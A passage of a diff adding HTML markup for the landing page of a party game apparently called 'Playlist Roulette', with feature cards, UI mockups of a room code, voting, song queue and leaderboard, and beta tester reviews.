+        <p class="font-display text-3xl font-extrabold text-white/15 mb-2">02</p>
+        <h3 class="font-display text-lg font-bold mb-1.5">Everyone drops 3–5 songs</h3>
+        <p class="text-white/50 text-sm leading-relaxed">Paste Spotify or YouTube links. The artwork loads instantly.</p>
+      </div>
+      <div class="hero-card p-6 group">
+        <div class="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center mb-4 group-hover:bg-emerald-500/20 transition-colors">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+        </div>
+        <p class="font-display text-3xl font-extrabold text-white/15 mb-2">03</p>
+        <h3 class="font-display text-lg font-bold mb-1.5">Host hits shuffle</h3>
+        <p class="text-white/50 text-sm leading-relaxed">Songs play one at a time, anonymously, on every screen.</p>
+      </div>
+      <div class="hero-card p-6 group">
+        <div class="w-10 h-10 rounded-xl bg-yellow-500/10 border border-yellow-500/20 flex items-center justify-center mb-4 group-hover:bg-yellow-500/20 transition-colors">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+        </div>
+        <p class="font-display text-3xl font-extrabold text-white/15 mb-2">04</p>
+        <h3 class="font-display text-lg font-bold mb-1.5">Vote, reveal, and roast</h3>
+        <p class="text-white/50 text-sm leading-relaxed">After the last track, the leaderboard reveals who picked what.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════ FEATURE SPOTLIGHT ═══════════════════════════════ -->
+<section id="features-detail" class="py-24 sm:py-32">
+  <div class="max-w-7xl mx-auto px-5">
+    <div class="max-w-2xl mb-16">
+      <span class="chip chip-primary mb-4">Features</span>
+      <h2 class="font-display text-4xl sm:text-5xl font-bold tracking-tight mt-3">Everything you need for the <span class="text-gradient">perfect music battle</span>.</h2>
+    </div>
+    <!-- FEATURE 1: Room Code — full width horizontal card -->
+    <div class="hero-card overflow-hidden mb-5" style="background:linear-gradient(135deg,rgba(217,70,239,.06) 0%,rgba(124,58,237,.04) 100%)">
+      <div class="grid lg:grid-cols-2 gap-0">
+        <!-- Left: text -->
+        <div class="p-8 lg:p-12 flex flex-col justify-center">
+          <div class="flex items-center gap-3 mb-5">
+            <div class="w-10 h-10 rounded-xl flex items-center justify-center" style="background:rgba(217,70,239,.15);border:1px solid rgba(217,70,239,.25)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#e879f9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+            </div>
+            <span class="chip chip-secondary text-xs">Instant rooms</span>
+          </div>
+          <h3 class="font-display text-2xl lg:text-3xl font-bold mb-3">One code. Everyone's in.</h3>
+          <p class="text-white/55 leading-relaxed mb-6">No accounts needed. Share a 6-letter code and your friends are in the room in seconds — on any device, any browser.</p>
+          <div class="flex flex-col gap-2">
+            <div class="flex items-center gap-2 text-sm text-white/50"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Works on mobile, tablet, desktop</div>
+            <div class="flex items-center gap-2 text-sm text-white/50"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Up to 10 players per room</div>
+            <div class="flex items-center gap-2 text-sm text-white/50"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Room stays alive until host closes it</div>
+          </div>
+        </div>
+        <!-- Right: UI mockup -->
+        <div class="relative overflow-hidden flex items-center justify-center p-8 lg:p-10" style="background:rgba(0,0,0,.2)">
+          <!-- Glow -->
+          <div class="absolute inset-0 pointer-events-none" style="background:radial-gradient(ellipse at 60% 50%,rgba(217,70,239,.12) 0%,transparent 70%)"></div>
+          <!-- Room card mockup -->
+          <div class="relative w-full max-w-xs">
+            <div class="rounded-2xl p-6" style="background:#0d0b1e;border:1px solid rgba(255,255,255,.08)">
+              <!-- Header -->
+              <div class="flex items-center justify-between mb-5">
+                <div class="flex items-center gap-2">
+                  <div style="width:1.75rem;height:1.75rem;flex-shrink:0;filter:drop-shadow(0 0 4px rgba(217,70,239,.5))">
+                    <svg width="28" height="28" viewBox="0 0 100 100" fill="none"><defs><radialGradient id="vinylBgS" cx="50%" cy="40%" r="55%"><stop offset="0%" stop-color="#9333ea"/><stop offset="60%" stop-color="#7c3aed"/><stop offset="100%" stop-color="#4c1d95"/></radialGradient><radialGradient id="vinylGlowS" cx="50%" cy="50%" r="50%"><stop offset="70%" stop-color="transparent"/><stop offset="100%" stop-color="#d946ef" stop-opacity=".8"/></radialGradient><radialGradient id="noteGradS" cx="40%" cy="30%" r="70%"><stop offset="0%" stop-color="#ffffff"/><stop offset="100%" stop-color="#e9d5ff"/></radialGradient></defs><circle cx="50" cy="50" r="48" fill="none" stroke="#d946ef" stroke-width="2" stroke-opacity=".6"/><circle cx="50" cy="50" r="45" fill="url(#vinylBgS)"/><circle cx="50" cy="50" r="35" fill="none" stroke="rgba(255,255,255,.07)" stroke-width="1.5"/><circle cx="50" cy="50" r="22" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="1.5"/><circle cx="50" cy="50" r="45" fill="url(#vinylGlowS)"/><ellipse cx="44" cy="62" rx="10" ry="8" fill="url(#noteGradS)"/><ellipse cx="44" cy="62" rx="4" ry="3.5" fill="#4c1d95"/><rect x="53" y="30" width="5" height="33" rx="2.5" fill="url(#noteGradS)"/><path d="M58 30 Q75 36 70 50 Q65 42 58 42 Z" fill="url(#noteGradS)"/></svg>
+                  </div>
+                  <span class="text-xs font-semibold text-white/60">Playlist Roulette</span>
+                </div>
+                <span class="chip chip-success" style="font-size:.65rem;padding:2px 7px">Live</span>
+              </div>
+              <p class="text-xs text-white/35 uppercase tracking-widest mb-1">Room Code</p>
+              <div class="font-display text-4xl font-extrabold tracking-[.2em] text-white mb-5" style="text-shadow:0 0 30px rgba(217,70,239,.5)">GH4K2N</div>
+              <!-- Players -->
+              <div class="flex flex-col gap-2.5 mb-5">
+                <div class="flex items-center gap-2.5">
+                  <div class="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold text-white" style="background:linear-gradient(135deg,#f59e0b,#ef4444)">A</div>
+                  <span class="text-sm text-white font-medium flex-1">Alex</span>
+                  <div class="flex gap-1"><div class="w-2 h-2 rounded-full bg-fuchsia-500"></div><div class="w-2 h-2 rounded-full bg-fuchsia-500"></div><div class="w-2 h-2 rounded-full bg-fuchsia-500"></div><div class="w-2 h-2 rounded-full" style="background:rgba(255,255,255,.12)"></div><div class="w-2 h-2 rounded-full" style="background:rgba(255,255,255,.12)"></div></div>
+                </div>
+                <div class="flex items-center gap-2.5">
+                  <div class="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold text-white" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6)">J</div>
+                  <span class="text-sm text-white font-medium flex-1">Jamie</span>
+                  <div class="flex gap-1"><div class="w-2 h-2 rounded-full bg-violet-500"></div><div class="w-2 h-2 rounded-full bg-violet-500"></div><div class="w-2 h-2 rounded-full" style="background:rgba(255,255,255,.12)"></div><div class="w-2 h-2 rounded-full" style="background:rgba(255,255,255,.12)"></div><div class="w-2 h-2 rounded-full" style="background:rgba(255,255,255,.12)"></div></div>
+                </div>
+                <div class="flex items-center gap-2.5">
+                  <div class="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold text-white" style="background:linear-gradient(135deg,#10b981,#3b82f6)">C</div>
+                  <span class="text-sm text-white font-medium flex-1">Casey</span>
+                  <div class="flex gap-1"><div class="w-2 h-2 rounded-full bg-fuchsia-500"></div><div class="w-2 h-2 rounded-full bg-fuchsia-500"></div><div class="w-2 h-2 rounded-full bg-fuchsia-500"></div><div class="w-2 h-2 rounded-full bg-fuchsia-500"></div><div class="w-2 h-2 rounded-full" style="background:rgba(255,255,255,.12)"></div></div>
+                </div>
+              </div>
+              <div class="rounded-xl py-2.5 text-center text-sm font-bold text-white" style="background:linear-gradient(90deg,#d946ef,#7c3aed)">Start Game</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FEATURE 2 + 3: two half-width cards -->
+    <div class="grid md:grid-cols-2 gap-5 mb-5">
+
+      <!-- FEATURE 2: Anonymous voting -->
+      <div class="hero-card overflow-hidden" style="background:linear-gradient(135deg,rgba(124,58,237,.06) 0%,rgba(217,70,239,.03) 100%)">
+        <div class="p-8">
+          <div class="flex items-center gap-3 mb-5">
+            <div class="w-10 h-10 rounded-xl flex items-center justify-center" style="background:rgba(124,58,237,.15);border:1px solid rgba(124,58,237,.25)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+            </div>
+            <span class="chip chip-primary text-xs">Anonymous</span>
+          </div>
+          <h3 class="font-display text-xl font-bold mb-2">Vote without the pressure</h3>
+          <p class="text-white/50 text-sm leading-relaxed mb-6">Nobody knows who picked what until the round ends. Pure music taste — zero social pressure.</p>
+          <!-- Vote UI mockup -->
+          <div class="rounded-2xl p-5" style="background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.06)">
+            <p class="text-xs text-white/35 text-center mb-3">Song 7 of 12 · Anonymous</p>
+            <!-- Waveform bars -->
+            <div class="flex items-end justify-center gap-1 h-12 mb-4">
+              <div class="w-1.5 rounded-full bg-violet-500/60" style="height:30%"></div>
+              <div class="w-1.5 rounded-full bg-violet-500/70" style="height:55%"></div>
+              <div class="w-1.5 rounded-full bg-fuchsia-500/80" style="height:80%"></div>
+              <div class="w-1.5 rounded-full bg-fuchsia-500" style="height:100%"></div>
+              <div class="w-1.5 rounded-full bg-fuchsia-500/90" style="height:90%"></div>
+              <div class="w-1.5 rounded-full bg-violet-500/80" style="height:70%"></div>
+              <div class="w-1.5 rounded-full bg-violet-500/60" style="height:45%"></div>
+              <div class="w-1.5 rounded-full bg-violet-500/50" style="height:35%"></div>
+              <div class="w-1.5 rounded-full bg-fuchsia-500/70" style="height:60%"></div>
+              <div class="w-1.5 rounded-full bg-fuchsia-500/90" style="height:85%"></div>
+              <div class="w-1.5 rounded-full bg-fuchsia-500" style="height:95%"></div>
+              <div class="w-1.5 rounded-full bg-violet-500/80" style="height:65%"></div>
+              <div class="w-1.5 rounded-full bg-violet-500/60" style="height:40%"></div>
+              <div class="w-1.5 rounded-full bg-violet-500/40" style="height:25%"></div>
+            </div>
+            <!-- Vote buttons -->
+            <div class="grid grid-cols-2 gap-2">
+              <button class="rounded-xl py-2.5 text-sm font-semibold text-white/60 transition-all" style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08)">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline mr-1"><path d="M10 15v4a3 3 0 003 3l4-9V2H5.72a2 2 0 00-2 1.7l-1.38 9a2 2 0 002 2.3z"/></svg>
+                Skip
+              </button>
+              <button class="rounded-xl py-2.5 text-sm font-bold text-white" style="background:linear-gradient(90deg,#d946ef,#7c3aed)">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" class="inline mr-1"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg>
+                Vote
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- FEATURE 3: Song queue -->
+      <div class="hero-card overflow-hidden" style="background:linear-gradient(135deg,rgba(34,197,94,.05) 0%,rgba(124,58,237,.04) 100%)">
+        <div class="p-8">
+          <div class="flex items-center gap-3 mb-5">
+            <div class="w-10 h-10 rounded-xl flex items-center justify-center" style="background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.22)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
+            </div>
+            <span class="chip chip-success text-xs">Song queue</span>
+          </div>
+          <h3 class="font-display text-xl font-bold mb-2">Drop your picks, see the queue</h3>
+          <p class="text-white/50 text-sm leading-relaxed mb-6">Each player adds 3–5 songs. The queue shuffles automatically so nobody knows the order.</p>
+          <!-- Queue mockup -->
+          <div class="rounded-2xl p-4" style="background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.06)">
+            <div class="flex items-center justify-between mb-3">
+              <span class="text-xs text-white/35 font-medium">Up next</span>
+              <span class="text-xs text-white/25">12 songs</span>
+            </div>
+            <div class="flex flex-col gap-2">
+              <!-- Midnight City — M83 -->
+              <div class="flex items-center gap-3 p-2 rounded-xl" style="background:rgba(217,70,239,.1);border:1px solid rgba(217,70,239,.2)">
+                <div class="w-8 h-8 rounded-lg flex-shrink-0 overflow-hidden">
+                  <img src="https://i.scdn.co/image/ab67616d00001e0290e9adff5f77dd1ff6d24e47" alt="Midnight City" class="w-full h-full object-cover" />
+                </div>
+                <div class="flex-1 min-w-0">
+                  <p class="text-xs font-semibold text-white truncate">Midnight City</p>
+                  <p class="text-xs text-white/35 truncate">M83</p>
+                </div>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.3)" stroke-width="2" stroke-linecap="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+              </div>
+              <!-- Blinding Lights — The Weeknd -->
+              <div class="flex items-center gap-3 p-2 rounded-xl" style="background:rgba(255,255,255,.03)">
+                <div class="w-8 h-8 rounded-lg flex-shrink-0 overflow-hidden">
+                  <img src="https://i.scdn.co/image/ab67616d00001e028863bc11d2aa12b54f5aeb36" alt="Blinding Lights" class="w-full h-full object-cover" />
+                </div>
+                <div class="flex-1 min-w-0">
+                  <p class="text-xs font-semibold text-white/70 truncate">Blinding Lights</p>
+                  <p class="text-xs text-white/30 truncate">The Weeknd</p>
+                </div>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.15)" stroke-width="2" stroke-linecap="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+              </div>
+              <!-- As It Was — Harry Styles -->
+              <div class="flex items-center gap-3 p-2 rounded-xl" style="background:rgba(255,255,255,.03)">
+                <div class="w-8 h-8 rounded-lg flex-shrink-0 overflow-hidden">
+                  <img src="https://i.scdn.co/image/ab67616d00001e0282ce362511fb3d9dda6578ee" alt="As It Was" class="w-full h-full object-cover" />
+                </div>
+                <div class="flex-1 min-w-0">
+                  <p class="text-xs font-semibold text-white/70 truncate">As It Was</p>
+                  <p class="text-xs text-white/30 truncate">Harry Styles</p>
+                </div>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.15)" stroke-width="2" stroke-linecap="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FEATURE 4: Leaderboard — full width -->
+    <div class="hero-card overflow-hidden" style="background:linear-gradient(135deg,rgba(251,191,36,.04) 0%,rgba(217,70,239,.04) 100%)">
+      <div class="grid lg:grid-cols-2 gap-0">
+        <!-- Left: Leaderboard UI -->
+        <div class="relative overflow-hidden p-8 lg:p-10 flex items-center justify-center" style="background:rgba(0,0,0,.15)">
+          <div class="absolute inset-0 pointer-events-none" style="background:radial-gradient(ellipse at 40% 50%,rgba(251,191,36,.08) 0%,transparent 70%)"></div>
+          <div class="relative w-full max-w-xs">
+            <!-- Winner banner -->
+            <div class="rounded-2xl p-5 mb-3" style="background:linear-gradient(135deg,rgba(251,191,36,.12),rgba(217,70,239,.08));border:1px solid rgba(251,191,36,.2)">
+              <div class="flex items-center gap-3">
+                <div class="relative">
+                  <div class="w-12 h-12 rounded-full flex items-center justify-center text-lg font-bold text-white" style="background:linear-gradient(135deg,#f59e0b,#ef4444)">A</div>
+                  <div class="absolute -top-2 -right-1 text-base">👑</div>
+                </div>
+                <div class="flex-1">
+                  <p class="text-xs text-yellow-300/70 font-semibold uppercase tracking-wider">Winner</p>
+                  <p class="font-display font-bold text-white">Alex</p>
+                  <p class="text-xs text-white/40">Midnight City · M83</p>
+                </div>
+                <div class="text-right">
+                  <p class="font-display text-2xl font-extrabold text-yellow-300">20</p>
+                  <p class="text-xs text-white/35">points</p>
+                </div>
+              </div>
+            </div>
+            <!-- Other players -->
+            <div class="rounded-2xl overflow-hidden" style="background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.06)">
+              <div class="flex items-center gap-3 px-4 py-3 border-b" style="border-color:rgba(255,255,255,.05)">
+                <span class="text-xs text-white/25 w-4">2</span>
+                <div class="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold text-white" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6)">J</div>
+                <span class="text-sm text-white/70 flex-1">Jamie</span>
+                <span class="text-sm font-bold text-white/60">14 pts</span>
+              </div>
+              <div class="flex items-center gap-3 px-4 py-3 border-b" style="border-color:rgba(255,255,255,.05)">
+                <span class="text-xs text-white/25 w-4">3</span>
+                <div class="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold text-white" style="background:linear-gradient(135deg,#10b981,#3b82f6)">C</div>
+                <span class="text-sm text-white/70 flex-1">Casey</span>
+                <span class="text-sm font-bold text-white/60">9 pts</span>
+              </div>
+              <div class="flex items-center gap-3 px-4 py-3">
+                <span class="text-xs text-white/25 w-4">4</span>
+                <div class="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold text-white" style="background:linear-gradient(135deg,#ec4899,#d946ef)">R</div>
+                <span class="text-sm text-white/70 flex-1">Robin</span>
+                <span class="text-sm font-bold text-white/60">5 pts</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- Right: text -->
+        <div class="p-8 lg:p-12 flex flex-col justify-center">
+          <div class="flex items-center gap-3 mb-5">
+            <div class="w-10 h-10 rounded-xl flex items-center justify-center" style="background:rgba(251,191,36,.12);border:1px solid rgba(251,191,36,.22)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="10" width="4" height="10" rx="1"/>
+                <rect x="9" y="4" width="4" height="16" rx="1"/>
+                <rect x="16" y="7" width="4" height="13" rx="1"/>
+              </svg>
+            </div>
+            <span class="chip chip-warning text-xs">Leaderboard</span>
+          </div>
+          <h3 class="font-display text-2xl lg:text-3xl font-bold mb-3">The reveal is the best part.</h3>
+          <p class="text-white/55 leading-relaxed mb-6">After the last song, everyone's picks are unmasked. See who has the best taste — and who's been hiding their guilty pleasures.</p>
+          <div class="flex flex-col gap-2">
+            <div class="flex items-center gap-2 text-sm text-white/50"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Points based on votes received</div>
+            <div class="flex items-center gap-2 text-sm text-white/50"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Song ownership revealed at the end</div>
+            <div class="flex items-center gap-2 text-sm text-white/50"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Replay the whole round instantly</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════════════════════ REVIEWS ═══════════════════════════════ -->
+<section id="reviews" class="scroll-mt py-24 sm:py-32" style="background:rgba(255,255,255,.012)">
+  <div class="max-w-7xl mx-auto px-5">
+    <div class="max-w-2xl mb-14">
+      <span class="chip chip-success mb-4">From the beta</span>
+      <h2 class="font-display text-4xl sm:text-5xl font-bold tracking-tight mt-3">
+        What testers are <span class="text-gradient">saying</span>.
+      </h2>
+    </div>
+    <div class="grid md:grid-cols-3 gap-5">
+      <div class="hero-card p-7 flex flex-col">
+        <div class="flex gap-0.5 mb-5">
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p class="text-white/80 leading-relaxed text-sm flex-1 mb-6">"Pre-game ritual is now a Roulette round. The anonymous voting is genius — nobody can fake a reaction once the leaderboard drops."</p>
+        <div class="flex items-center gap-3">
+          <div class="avatar">M</div>
+          <div><p class="font-semibold text-sm">Mira K.</p><p class="text-xs text-white/40">Beta tester · Berlin</p></div>
+        </div>
+      </div>
+      <div class="hero-card p-7 flex flex-col">
+        <div class="flex gap-0.5 mb-5">
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p class="text-white/80 leading-relaxed text-sm flex-1 mb-6">"Used it in a road trip with 6 people on different phones. Zero lag, songs synced perfectly. Way more fun than passing the aux."</p>
+        <div class="flex items-center gap-3">
+          <div class="avatar">T</div>
+          <div><p class="font-semibold text-sm">Tarek A.</p><p class="text-xs text-white/40">Beta tester · Istanbul</p></div>
+        </div>
+      </div>
+      <div class="hero-card p-7 flex flex-col">
+        <div class="flex gap-0.5 mb-5">
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
